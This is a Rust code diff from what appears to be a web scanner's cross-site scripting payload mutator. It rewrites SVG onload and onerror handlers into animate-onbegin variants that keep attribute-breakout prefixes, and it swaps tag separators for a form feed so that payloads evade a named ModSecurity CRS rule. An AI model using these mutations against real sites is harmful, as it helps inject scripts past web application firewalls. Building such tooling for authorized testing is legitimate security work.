@@ -387,17 +387,23 @@ pub(super) fn html_entity_parens(payload: &str) -> String {
 /// Generate SVG animate element-based execution payload.
 /// If the payload contains `<svg onload=X>`, transform to `<svg><animate onbegin=X attributeName=x dur=1s>`
 /// For other payloads containing event handlers, wrap in SVG animate.
+/// Only the opening tag is rewritten: any breakout prefix (`"><`) and the
+/// attributes after the handler (the class/id marker) are kept, otherwise the
+/// variant can neither break out of an attribute nor be marker-verified.
 pub(super) fn svg_animate_exec(payload: &str) -> String {
+    const HANDLER_END: [char; 4] = [' ', '>', '\t', '\n'];
     // Transform svg onload variants to svg animate onbegin
     for prefix in &["<svg onload=", "<SVG ONLOAD=", "<sVg onload="] {
-        if let Some(rest) = payload.strip_prefix(prefix)
-            && let Some(handler_end) = rest.find('>')
+        if let Some(idx) = payload.find(prefix)
+            && payload[idx..].contains('>')
         {
-            let handler = &rest[..handler_end];
-            let clean_handler = handler.split_whitespace().next().unwrap_or(handler);
+            let rest = &payload[idx + prefix.len()..];
+            let end = rest.find(HANDLER_END).unwrap_or(rest.len());
             return format!(
-                "<svg><animate onbegin={} attributeName=x dur=1s>",
-                clean_handler
+                "{}<svg><animate onbegin={} attributeName=x dur=1s{}",
+                &payload[..idx],
+                &rest[..end],
+                &rest[end..]
             );
         }
     }
@@ -406,38 +412,28 @@ pub(super) fn svg_animate_exec(payload: &str) -> String {
         for prefix in &["onerror=", "ONERROR="] {
             if let Some(idx) = payload.find(prefix) {
                 let after = &payload[idx + prefix.len()..];
-                let handler_end = after.find([' ', '>', '\t', '\n']).unwrap_or(after.len());
-                let handler = &after[..handler_end];
-                return format!("<svg><animate onbegin={} attributeName=x dur=1s>", handler);
+                let end = after.find(HANDLER_END).unwrap_or(after.len());
+                let tag_start = payload[..idx].rfind('<').unwrap_or(0);
+                return format!(
+                    "{}<svg><animate onbegin={} attributeName=x dur=1s{}",
+                    &payload[..tag_start],
+                    &after[..end],
+                    &after[end..]
+                );
             }
         }
     }
     payload.to_string()
 }
 
-/// Pick the alt exotic-whitespace char (\x0B vertical tab vs \x0C form
-/// feed) for a `<TAG SEP ATTR` match. CRS rule 941320 only checks `\s`
-/// (space/tab/newline); both VT and FF slip past it.
-///
-/// Mapping reproduces prior outputs for the tags previously listed —
-/// svg/body/details with a space separator get `\x0C`, slash-separated
-/// or any other tag get `\x0B` — and extends `\x0B` to every other tag.
-fn exotic_alt_char(tag_lower: &str, sep: char) -> char {
-    if sep == '/' {
-        return '\x0B';
-    }
-    match tag_lower {
-        "svg" | "body" | "details" => '\x0C',
-        _ => '\x0B',
-    }
-}
-
 /// Replace the separator between an HTML tag and its first attribute
-/// with an exotic whitespace char. Mutates only the first match.
+/// with a form feed. CRS rule 941320 only checks `\s` (space/tab/newline);
+/// FF slips past it. Vertical tab (`\x0B`) must not be used: it is not HTML
+/// whitespace, so `<img\x0Bsrc=x ...>` parses as one bogus tag name and never
+/// executes. Mutates only the first match.
 pub(super) fn exotic_whitespace(payload: &str) -> String {
-    if let Some((tag, sep_idx, sep)) = find_first_tag_attr_break(payload) {
-        let alt = exotic_alt_char(&tag, sep);
-        return replace_byte_at(payload, sep_idx, alt);
+    if let Some((_tag, sep_idx, _sep)) = find_first_tag_attr_break(payload) {
+        return replace_byte_at(payload, sep_idx, '\x0C');
     }
     payload.to_string()
 }
